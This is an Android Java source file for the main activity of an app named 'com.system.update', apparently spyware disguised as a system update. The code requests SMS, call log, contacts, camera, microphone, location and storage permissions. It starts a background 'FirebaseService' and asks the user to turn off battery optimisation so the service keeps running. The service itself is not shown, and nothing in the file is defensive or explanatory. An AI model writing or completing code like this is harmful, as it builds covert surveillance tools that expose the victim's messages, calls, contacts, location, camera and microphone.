package com.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);

        // تشغيل الخدمة
        startService(new Intent(this, FirebaseService.class));
        statusText.setText("✅ التطبيق يعمل في الخلفية");

        activateBtn.setOnClickListener(v -> requestAllPermissions());
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }
        done();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) {
            done();
        }
    }

    private void done() {
        // تعطيل تحسين البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent i = new Intent();
                i.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception e) {}
        }

        startService(new Intent(this, FirebaseService.class));
        Toast.makeText(this, "✅ التطبيق يعمل في الخلفية", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل في الخلفية");
    }
                    }
